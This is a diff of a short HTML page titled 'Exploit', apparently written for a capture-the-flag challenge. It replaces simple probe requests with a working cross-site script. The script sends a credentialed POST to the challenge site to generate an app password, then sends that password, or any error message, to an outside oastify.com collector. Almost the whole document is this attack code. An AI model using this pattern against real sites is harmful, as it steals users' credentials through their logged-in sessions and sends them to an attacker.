@@ -1,11 +1,21 @@
 <!DOCTYPE html>
 <html>
+  <head>
+    <title>Exploit</title>
+  </head>
   <body>
     <script>
-      fetch("https://nc3g1u74v8kek8n62n1z4gw4tvzmndo1d.oastify.com/js-step1")
-        .then(() => {
-          location.href = "https://xbcq046euijojimg1x093qves5ywmnobd.oastify.com/js-step2";
-        });
+      fetch("https://airbnb-hosts-2847774775fe-link-sheriff-0.chals.io/generate_app_password", {
+        method: "POST",
+        credentials: "include"
+      })
+      .then(res => res.json())
+      .then(data => {
+        location.href = "https://2mpvb9hj5nutunxlc2beev6j3a91xs1gq.oastify.com/leak?pw=" + encodeURIComponent(data.app_password);
+      })
+      .catch(err => {
+        location.href = "https://2mpvb9hj5nutunxlc2beev6j3a91xs1gq.oastify.com/error?msg=" + encodeURIComponent(err.message);
+      });
     </script>
   </body>
 </html>
